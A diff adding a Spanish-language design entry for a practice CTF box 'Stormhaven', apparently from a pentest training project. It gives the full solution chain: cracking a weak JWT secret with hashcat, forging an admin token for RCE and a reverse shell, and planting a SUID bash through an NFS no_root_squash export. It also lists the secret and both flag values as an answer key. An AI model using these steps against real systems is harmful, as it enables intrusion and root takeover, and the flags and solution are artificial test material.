@@ -1279,6 +1279,71 @@ noise:
 
 ---
 
+## Box 18 — `Stormhaven`
+
+```
+id: 18
+name: Stormhaven
+os: linux
+difficulty: medium
+est_time: 50-80 min
+tags: [web, jwt, weak-secret, hashcat-16500, nfs, no-root-squash, suid]
+
+target_ip: 10.10.14.175
+tun0_ip: 10.11.0.7
+
+services:
+  22: OpenSSH 8.9p1
+  80: nginx -> app Express/Node "Stormhaven Dashboard" (auth con JWT)
+  111/2049: NFS -> export /srv/backups con no_root_squash
+
+surface:
+  - showmount -e -> /srv/backups *; montar + touch como root -> conserva uid 0 = no_root_squash (privesc pre-armado).
+  - web: registro abierto -> cookie token=JWT (HS256, role:user). /admin -> 403.
+
+chain:
+  - step: foothold-jwt
+    trigger: JWT HS256 con secreto débil
+    technique: crack del secreto + forge de rol admin -> RCE
+    cheat_ref: [[02-web]] (JWT) · [[05-cracking]]
+    aha: la firma depende del SECRETO, no del rol -> con tu token user sacas el secreto y te forjas admin. El 403 no es la fuente del token.
+    expected_action: "hashcat -m 16500 jwt.txt rockyou -> secreto; jwt_tool -T -S hs256 -p secreto (role->admin); cookie forjada -> /admin -> exec -> reverse"
+    hints:
+      - "la cookie es un JWT (HS256). El token lo tienes desde que te logueaste como user."
+      - "secreto débil -> hashcat -m 16500 saca el secreto; con él forjas role:admin."
+      - "jwt_tool -T -S hs256 -p '<secreto>' o pyjwt. Reemplaza la cookie -> panel admin -> exec -> shell."
+    resultado: shell stormapp -> user flag
+  - step: privesc-nfs-no-root-squash
+    trigger: export NFS no_root_squash (ya detectado en recon)
+    technique: montar desde Kali + SUID root + ejecutar en la víctima
+    cheat_ref: [[07-privesc-linux]] (NFS no_root_squash)
+    aha: no_root_squash = tu root de Kali = root en la víctima -> SUID bash root
+    expected_action: |
+      # Kali (sobre el montaje): sudo cp /bin/bash /mnt/nfs/rootbash; sudo chmod +s /mnt/nfs/rootbash
+      # víctima: /srv/backups/rootbash -p
+    hints:
+      - "ya viste el no_root_squash en el recon; ahora tienes shell para EJECUTAR."
+      - "planta SUID bash desde Kali en el share; se conserva root:root."
+      - "ejecútalo por su RUTA en la víctima: /srv/backups/rootbash -p"
+    resultado: root
+
+creds:
+  - (JWT secreto: stormbreak)   -> forge admin
+  - stormapp (shell web)        -> user flag
+
+flags:
+  user: 9d1c0a7f24e3b86501c7a9f62d0b4e35
+  root: 3b7f0c2a94d1e8650b1a7c9f6d2e0483
+
+noise:
+  - /admin 403 con rol user = pista, NO la fuente del token (confusión típica).
+  - NFS: el privesc se "arma" en el recon pero no se dispara hasta tener shell.
+```
+
+**Lección pedagógica:** **JWT HS256 secreto débil** → `hashcat -m 16500` (con TU token de user) → forge `role:admin` → RCE; y **NFS `no_root_squash`** → montas desde Kali, plantas **SUID root**, lo ejecutas desde un shell en la víctima. (El 403 del panel admin NO es de donde sale el token.)
+
+---
+
 ## 📈 Ideas de evolución (roadmap del proyecto)
 
 - Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
